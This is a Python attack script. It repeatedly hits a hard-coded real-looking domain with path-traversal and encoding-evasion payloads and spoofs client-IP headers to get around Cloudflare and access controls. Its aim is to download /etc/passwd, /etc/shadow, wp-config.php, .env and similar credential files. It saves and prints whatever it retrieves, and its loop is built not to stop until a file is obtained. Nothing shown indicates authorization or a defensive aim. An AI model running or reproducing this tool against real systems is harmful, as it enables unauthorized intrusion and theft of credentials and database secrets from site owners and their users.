#!/usr/bin/env python3
import requests
import random
import time
import os
import base64
import urllib.parse
from datetime import datetime

class AdaptiveBypassTester:
    def __init__(self):
        self.target = "https://pakyok77.link"
        self.attempt = 0
        self.successful_downloads = []
        self.failed_payloads = set()
        self.working_techniques = []
        
    def evolve_headers(self, generation=1):
        """Evolve headers based on generation"""
        base_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36',
            'curl/7.81.0', 'Wget/1.21.2', 'python-requests/2.28.1'
        ]
        
        # Evolve based on generation
        if generation > 10:
            base_agents.extend([
                f'CustomBot/{generation}.0',
                f'BypassTool-{generation}',
                f'SecurityTest-{random.randint(1,999)}'
            ])
        
        bypass_ips = [
            '127.0.0.1', '192.168.1.1', '10.0.0.1', '172.16.0.1',
            '0.0.0.0', '::1', 'localhost',
            f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        ]
        
        headers = {
            'User-Agent': random.choice(base_agents),
            'X-Forwarded-For': random.choice(bypass_ips),
            'X-Real-IP': random.choice(bypass_ips),
            'X-Originating-IP': random.choice(bypass_ips),
            'X-Remote-IP': random.choice(bypass_ips),
            'X-Remote-Addr': random.choice(bypass_ips),
            'X-ProxyUser-Ip': random.choice(bypass_ips),
            'X-Forwarded-Host': random.choice(['localhost', '127.0.0.1', 'internal.local']),
            'X-Forwarded-Proto': 'https',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        
        # Add evolved headers based on generation
        if generation > 5:
            headers.update({
                'X-Cluster-Client-IP': random.choice(bypass_ips),
                'X-Client-IP': random.choice(bypass_ips),
                'CF-Connecting-IP': random.choice(bypass_ips),
                'True-Client-IP': random.choice(bypass_ips)
            })
        
        return headers
    
    def evolve_payloads(self, target_file, generation=1):
        """Generate evolved payloads based on generation and previous failures"""
        payloads = []
        
        # Basic traversal (always include)
        for depth in range(1, 12 + generation):
            payloads.append('../' * depth + target_file)
        
        # URL encoding evolution
        for depth in range(1, 8 + generation // 2):
            payloads.append('%2e%2e%2f' * depth + target_file)
            payloads.append('%252e%252e%252f' * depth + target_file)
            if generation > 3:
                payloads.append('%25252e%25252e%25252f' * depth + target_file)
        
        # Advanced techniques unlock with generation
        if generation > 2:
            payloads.extend([
                f'..\\{target_file}',
                f'..%5c{target_file}',
                f'..%255c{target_file}',
                f'....%2f%2f{target_file}',
                f'..%c0%af{target_file}',
                f'..%c1%9c{target_file}'
            ])
        
        if generation > 5:
            payloads.extend([
                f'.%2e/{target_file}',
                f'%2e%2e\\{target_file}',
                f'..%2f%2e%2e%2f{target_file}',
                f'%2e%2e%5c%2e%2e%5c{target_file}',
                f'..%00/{target_file}',
                f'..%0d%0a/{target_file}'
            ])
        
        if generation > 8:
            # Advanced filter evasion
            payloads.extend([
                target_file.replace('/', '%2f'),
                target_file.replace('/', '%252f'),
                target_file.replace('/', '\\'),
                target_file.replace('/', '%5c'),
                target_file.replace('.', '%2e'),
                target_file.replace('.', '%252e'),
                base64.b64encode(target_file.encode()).decode(),
                urllib.parse.quote_plus(target_file)
            ])
        
        # Remove failed payloads
        payloads = [p for p in payloads if p not in self.failed_payloads]
        
        return payloads
    
    def test_bypass(self, target_file, generation=1):
        """Test bypass with evolved techniques"""
        payloads = self.evolve_payloads(target_file, generation)
        parameters = ['page', 'file', 'include', 'path', 'view', 'load', 'read', 'doc', 'document', 'dir']
        endpoints = ['index.php', 'main.php', 'view.php', 'include.php', 'file.php', 'admin.php']
        
        # Add more endpoints based on generation
        if generation > 3:
            endpoints.extend(['load.php', 'read.php', 'get.php', 'fetch.php'])
        
        for endpoint in endpoints:
            for param in parameters:
                for payload in payloads:
                    self.attempt += 1
                    
                    headers = self.evolve_headers(generation)
                    url = f"{self.target}/{endpoint}"
                    
                    try:
                        response = requests.get(
                            url, 
                            params={param: payload}, 
                            headers=headers, 
                            timeout=5,
                            allow_redirects=False
                        )
                        
                        if self.check_success(response, target_file):
                            print(f"\n🎉 BYPASS SUCCESS! Generation #{generation}, Attempt #{self.attempt}")
                            print(f"📁 File: {target_file}")
                            print(f"🌐 URL: {url}?{param}={payload}")
                            print(f"📊 Status: {response.status_code}")
                            print(f"📏 Size: {len(response.text)} bytes")
                            
                            # Save successful technique
                            technique = {
                                'file': target_file,
                                'endpoint': endpoint,
                                'param': param,
                                'payload': payload,
                                'headers': headers,
                                'generation': generation,
                                'content': response.text
                            }
                            
                            self.working_techniques.append(technique)
                            self.save_download(technique)
                            return True
                        else:
                            # Mark as failed
                            self.failed_payloads.add(payload)
                            
                    except Exception:
                        self.failed_payloads.add(payload)
                        continue
                    
                    time.sleep(0.02)
        
        return False
    
    def check_success(self, response, target_file):
        """Enhanced success detection"""
        if response.status_code not in [200, 301, 302]:
            return False
        
        content = response.text.lower()
        
        # Check if blocked
        if any(x in content for x in ['cloudflare', 'blocked', 'forbidden', 'ray id', 'attention required']):
            return False
        
        # File-specific indicators
        indicators = {
            'etc/passwd': ['root:', 'bin:', 'daemon:', 'sys:', 'nobody:', '/bin/bash', '/bin/sh'],
            'etc/shadow': ['root:', '$', 'hash', '::', '!'],
            'etc/hosts': ['localhost', '127.0.0.1', 'broadcasthost'],
            'proc/version': ['linux', 'version', 'gcc', 'kernel'],
            'proc/cpuinfo': ['processor', 'vendor_id', 'cpu family'],
            'wp-config.php': ['db_name', 'db_user', 'db_password', 'wp_', 'mysql'],
            'config.php': ['<?php', 'database', 'password', 'host', 'user'],
            '.env': ['app_key', 'db_', 'mail_', 'redis_', 'aws_', '='],
            '.htaccess': ['rewriteengine', 'rewriterule', 'deny from', 'options'],
            'database.php': ['<?php', 'database', 'connection', 'host', 'port']
        }
        
        for file_pattern, file_indicators in indicators.items():
            if file_pattern in target_file.lower():
                if any(indicator in content for indicator in file_indicators):
                    return True
        
        # Generic success check
        if (len(response.text) > 300 and 
            response.status_code == 200 and
            not any(x in content for x in ['<html>', '<body>', '<!doctype', '<title>'])):
            return True
        
        return False
    
    def save_download(self, technique):
        """Save successful download"""
        os.makedirs("adaptive_downloads", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"adaptive_downloads/{technique['file'].replace('/', '_')}_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"# ADAPTIVE BYPASS SUCCESS!\n")
            f.write(f"# File: {technique['file']}\n")
            f.write(f"# URL: {technique['endpoint']}?{technique['param']}={technique['payload']}\n")
            f.write(f"# Generation: {technique['generation']}\n")
            f.write(f"# Attempt: {self.attempt}\n")
            f.write(f"# Timestamp: {datetime.now()}\n")
            f.write("=" * 80 + "\n\n")
            f.write(technique['content'])
        
        self.successful_downloads.append({
            'file': technique['file'],
            'path': filename,
            'content': technique['content'],
            'size': len(technique['content'])
        })
        
        print(f"💾 Saved: {filename}")
    
    def display_all_downloads(self):
        """Display all downloaded files"""
        print("\n" + "="*80)
        print("📁 ALL DOWNLOADED FILES")
        print("="*80)
        
        for download in self.successful_downloads:
            print(f"\n🔸 FILE: {download['file']}")
            print(f"💾 Path: {download['path']}")
            print(f"📊 Size: {download['size']} bytes")
            print("-" * 60)
            print(download['content'])
            print("-" * 60)
    
    def run_adaptive_test(self):
        """Run adaptive bypass testing"""
        print("🚀 ADAPTIVE BYPASS TESTER STARTED")
        print("=" * 70)
        print("🧬 Will evolve payloads until breakthrough!")
        print("🎯 Target:", self.target)
        print("🔄 Will NOT stop until files are downloaded!")
        print("=" * 70)
        
        target_files = [
            'etc/passwd',
            'etc/shadow',
            'etc/hosts',
            'proc/version',
            'proc/cpuinfo',
            'wp-config.php',
            'config.php',
            '.env',
            '.htaccess',
            'database.php'
        ]
        
        generation = 1
        
        while not self.successful_downloads:
            print(f"\n🧬 GENERATION #{generation} - Evolving techniques...")
            
            for target_file in target_files:
                print(f"\n🔍 Testing: {target_file} (Gen {generation})")
                
                if self.test_bypass(target_file, generation):
                    print(f"✅ SUCCESS: {target_file}")
                else:
                    print(f"❌ Failed: {target_file} (Gen {generation})")
            
            if self.successful_downloads:
                print(f"\n🎉 BREAKTHROUGH ACHIEVED!")
                print(f"✅ Downloaded {len(self.successful_downloads)} files!")
                self.display_all_downloads()
                break
            
            generation += 1
            print(f"\n🧬 Generation {generation-1} complete. Evolving to Gen {generation}...")
            print(f"📊 Total attempts: {self.attempt}")
            print(f"🚫 Failed payloads: {len(self.failed_payloads)}")
            time.sleep(1)

def main():
    tester = AdaptiveBypassTester()
    tester.run_adaptive_test()

if __name__ == "__main__":
    main()